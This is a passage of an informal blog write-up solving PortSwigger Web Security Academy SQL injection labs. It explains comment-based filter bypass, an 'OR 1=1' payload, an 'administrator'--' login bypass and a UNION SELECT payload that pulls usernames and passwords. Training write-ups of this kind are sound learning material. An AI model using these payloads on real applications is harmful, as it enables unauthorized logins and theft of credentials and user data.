---
layout: default
title : Muzec - SQL Injection - PortSwigger Web Academy 
---


### SQL Injection

Man it all about knowledge seriously everyone love that keep on learning man so i will be learning more on sql injection on portswigger academy feel free to learn along it will be long and fun. Don't be scared man we can solve all lol.

![image](https://user-images.githubusercontent.com/69868171/146219849-7e357c78-2bbd-4c1e-b467-86c19a93899b.png)


Now let get started already.

### What Is SQL Injecion

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior. 

*Taken From PortSwigger*

We all know it about interfering with sql queries to see what we have in the backend let dig in more.

### Impact Of A Successful SQL Injection Attack Vulnerabilities 

A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.


### SQL Injection Example With Hands On Labs ---> Retrieving Hidden Data

Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL: 

```
https://insecure-website.com/products?category=Gifts 
```

This causes the application to make an SQL query to retrieve details of the relevant products from the database: 
 
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
```

This SQL query asks the database to return: 


```
all details (*)
FROM the products tables
WHERE the Category is Gifts
and released is 1.
```

The restriction `released = 1` is being used to hide products that are not released. For unreleased products, presumably `released = 0`. 

The application doesn't implement any defenses against SQL injection attacks, so an attacker can construct an attack like: 
 
```
https://insecure-website.com/products?category=Gifts'-- 
```

This results in the SQL query:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

The key thing here is that the double-dash sequence `--` is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment. This effectively removes the remainder of the query, so it no longer includes `AND released = 1`. This means that all products are displayed, including unreleased products.

Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about: 

```
https://insecure-website.com/products?category=Gifts'+OR+1=1-- 
```

This results in the SQL query:

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
The modified query will return all items where either the category is `Gifts, or 1 is equal to 1`. Since `1=1` is always `true`, the query will return all items. 

Now let play with some labs.

### SQL Injection Lab 1

```
Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
```

This lab contains an `SQL injection` vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased. 

![image](https://user-images.githubusercontent.com/69868171/146226619-b674d609-5241-43bf-b8bd-dcbaa98d3d3e.png)

let access the lab.

![image](https://user-images.githubusercontent.com/69868171/146227012-0c9b6990-7ac9-47ca-bfdc-078e574b05d9.png)

Now let see what we have when we click on `Gifts` .

```
https://acbf1fde1fd94946c1df5b4e002500a4.web-security-academy.net/filter?category=Gifts
```

Which is just like the following below;

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
```

Now let exploit it.

![image](https://user-images.githubusercontent.com/69868171/146227735-50be270d-4633-43d0-8016-3bf68e8ddc36.png)

We can see that we have only 3 products listed but to solve the lab we need perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

```
https://acbf1fde1fd94946c1df5b4e002500a4.web-security-academy.net/filter?category=Lifestyle'+OR+1=1-- 
```

Our Query will be like that below;

```
SELECT * FROM products WHERE category = 'Lifestyle' OR 1=1--' AND released = 1
```

Now let try it.

![image](https://user-images.githubusercontent.com/69868171/146230544-f0b313fd-11f9-4b74-b241-30adb9320962.png)

Boom we solve it and have more products show to us.

![image](https://user-images.githubusercontent.com/69868171/146230656-2c05069f-3620-4221-928c-3509d39b2722.png)

Which mean we are done with the lab 1. Let move forward.

### Subverting Application Logic

Consider an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

This query returns the user whose username is `administrator` and successfully logs the attacker in as that user.


### SQL Injection Lab 2

```
Lab: SQL injection vulnerability allowing login bypass
```

This lab contains an `SQL injection` vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.

Now let access the lab.

![image](https://user-images.githubusercontent.com/69868171/146233475-22dc4c45-ea09-46b4-aac8-8b3946a782e0.png)

Now let click on `my account` to log in.

![image](https://user-images.githubusercontent.com/69868171/146233553-ea75de43-931e-40d8-9d3f-9a2e6c8b06d6.png)

We have a login page if i can remember the goal clearly we need to access the `administrator` account using sql injection to exploit it. Now let hit it.

```
username:- administrator'--
password:- <blank>
```

![image](https://user-images.githubusercontent.com/69868171/146233915-bdb8cf2b-a37e-47ac-b91f-7e655e68fa3c.png)

Now let log in we can use `burp suite` to intercept the request to make the password field blank.

![image](https://user-images.githubusercontent.com/69868171/146234630-f1315bce-aeea-48f3-be56-37de349ec2fa.png)

I remove the `12` i added has password and send request and boom we are in and administrator account access.

![image](https://user-images.githubusercontent.com/69868171/146234914-b607ea27-8490-4d36-817a-7c64e8027188.png)

We are done and lab 2 clear.

### Retrieving Data From Other Database Tables

In cases where the results of an SQL query are returned within the application's responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database. This is done using the `UNION` keyword, which lets you execute an additional `SELECT` query and append the results to the original query.

For example, if an application executes the following query containing the user input `"Gifts":`

```
SELECT name, description FROM products WHERE category = 'Gifts'
```

then an attacker can submit the input:

```
' UNION SELECT username, password FROM users--
```

This will cause the application to return all usernames and passwords along with the names and descriptions of products. 

Now time to get our hands dirty on sql inection union attack.


### SQL Injection UNION Attacks

